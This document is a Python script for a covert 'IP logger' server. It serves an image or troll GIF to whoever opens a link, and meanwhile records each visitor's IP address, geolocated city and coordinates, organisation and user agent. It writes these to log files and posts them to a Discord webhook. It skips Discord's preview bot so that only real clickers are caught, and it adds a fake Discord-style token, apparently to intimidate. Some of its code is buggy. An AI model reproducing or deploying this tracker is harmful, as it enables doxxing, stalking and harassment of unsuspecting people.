import os
import base64

# Made by ! zeroo#2801, skid and i send nukes 👍

import http.server
import socketserver
import os
import datetime
import requests
import geocoder
import json
import ipaddress

# dont touch until you know what you are doing, you will break the vpn checker
PRIVATE_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('100.64.0.0/10'),
]

# dont touch until you know what you are doing, you will break the vpn checker
KNOWN_VPN_IPS = [
    ipaddress.ip_address('1.1.1.1'),
    ipaddress.ip_address('2.2.2.2'),
    ipaddress.ip_address('3.3.3.3'),
]

with open("stuff/setting.json", "r") as f:
  data = json.load(f)

webhook = data["webhook"]
logging = data["enable_logging"]
toggle_web = data["webhook_toggle"]
vpn_check = data["check_vpn"]
image = data["image_path"]
gif = data["gif_path"]
troll = data["troll_gif"]
toggle_log = data["save_txt"]

blacklisted_agents = ["Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"]

# modify if you have knowledge of python
class IPHandler(http.server.BaseHTTPRequestHandler):
    def _set_headers(self):
        filename = self.path[1:]
        if os.path.isfile(filename):
          self.send_response(200)
          self.send_header('Content-type', 'image/jpg')
          self.end_headers()
          with open(image, 'rb') as f:
            self.wfile.write(f.read())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()

    if logging:
     def do_GET(self):
        if troll:
          self.send_response(200)
          self.send_header('Content-type', 'image/gif')
          self.end_headers()
          with open(gif, 'rb') as f:
            self.wfile.write(f.read())
        try:
            if 'X-Forwarded-For' in self.headers:
                ip_real = self.headers['X-Forwarded-For'].split(',')[0]
            else:
                ip_real = self.client_address[0]

            g = geocoder.ip(ip_real)
            lat, lng = g.latlng
            latitude = f'{lat}'
            longitude = f'{lng}'
            random_bytes = os.urandom(67)
            token = "MTA3" + base64.b64encode(random_bytes).decode()

        
            city = g.city
            region = g.state
            country = g.country
            org = g.org

            headers = self.headers
            user_agent = headers.get('User-Agent')
            host = headers.get('Host')
            encoding = headers.get('Accept-Encoding')

            if vpn_check:
                is_proxy = headers.get('Via') or headers.get('X-Forwarded-For')

                if headers.get('X-Real-IP'):
                    ip_address = headers['X-Real-IP']
                elif headers.get('X-Forwarded-For'):
                    ip_address = headers['X-Forwarded-For'].split(',')[0]
                else:
                    ip_address = headers.get('REMOTE_ADDR', '')
    
                vpn_ip = ipaddress.ip_address(ip_address)
                is_vpn = False
    
                for network in PRIVATE_NETWORKS:
                    if vpn_ip in network:
                        if str(vpn_ip).startswith(str(network)[:-3] + '168.'):
                            is_vpn = False
                        else:
                            is_vpn = True
                    break
    
                if not is_vpn:
                    if vpn_ip in KNOWN_VPN_IPS:
                        is_vpn = True
            
                if is_proxy:
                    is_vpn = True
                else:
                    is_vpn = False

            if toggle_log:
                if not os.path.exists(f"logs/{ip_real}"):
                    with open(f"logs/{ip_real}.txt", "w") as f:
                        f.write(f"IP address: {ip_real}\n")
                        f.write(f"Location: {city}, {region}, {country}\n")
                        f.write(f"Coordinates: {latitude}, {longitude}\n")
                        f.write(f"Organization: {org}\n")
                        f.write(f"User Agent: {user_agent}\n")
                        f.write(f"Host: {host}\n")
                        f.write(f"Accept Encoding: {encoding}\n")
                        f.write(f"Token: {token}\n")
                        if vpn_check:
                            f.write(f"Is Proxy: {bool(is_proxy)}\n")
                            f.write(f"Is VPN: {is_vpn}\n")
                else:
                    with open(f"logs/{ip_real}.txt", "w") as f:
                        f.write(f"IP address: {ip_real}\n")
                        f.write(f"Location: {city}, {region}, {country}\n")
                        f.write(f"Coordinates: {latitude}, {longitude}\n")
                        f.write(f"Organization: {org}\n")
                        f.write(f"User Agent: {user_agent}\n")
                        f.write(f"Host: {host}\n")
                        f.write(f"Accept Encoding: {encoding}\n")
                        f.write(f"Token: {token}\n")
                        if vpn_check:
                            f.write(f"Is Proxy: {bool(is_proxy)}\n")
                            f.write(f"Is VPN: {is_vpn}\n")
       
            if is_vpn or is_proxy:
                message = f"There's presence of a VPN.\n**User-Agent:** {user_agent}\n\n**Host:** {host}\n**Accept-Encoding:** {encoding}"
                ip = f"{vpn_ip}"
                url = f"https://whatismyipaddress.com/ip/{vpn_ip}"
                color = 0xFFB6C1
            else:
                message = f"**User-Agent:** {user_agent}\n\n\n**Host:** {host}\n**Accept-Encoding:** {encoding}"
                ip = f"{ip_real}"
                url = f"https://whatismyipaddress.com/ip/{ip}"
                color = 0xFFB6C1
        
            if user_agent not in blacklisted_agents:
                embed = {
                    "title": "**+leaks ip logger**",
                    "color": color,
                    "fields": [
                        {
                            "name": "IP Address",
                            "value": ip
                        },
                        {
                            "name": "Location",
                            "value": f"{city}, {region}, {country}\n{latitude}, {longitude}\n{org}"
                        },
                        {
                            "name": "More info",
                            "value": message
                        },
                        {
                          "name": "Token",
                          "value": token                          
                        }
                    ],
                    "footer": {
                    "text": url
                    },
                    "thumbnail": {
                    "url": "https://media.discordapp.net/attachments/1098269219977695387/1100381884220977162/static.png"
                    }
                }
                payload = {
                    "embeds": [embed]
                }
            
                if toggle_web:
                    requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
                    print(f"{ip} - {self.headers['User-Agent']} [{datetime.now().strftime('%d/%b/%Y %H:%M:%S')}] \"{self.command} {self.path} {self.request_version}\" {self.send_response(200)}")

        except Exception as e:
            print(f"error: {e}")
        
        self._set_headers()

PORT = 8000

with socketserver.TCPServer(('', PORT), IPHandler) as httpd:
    print(f'Server started on port {PORT}')
    httpd.serve_forever()
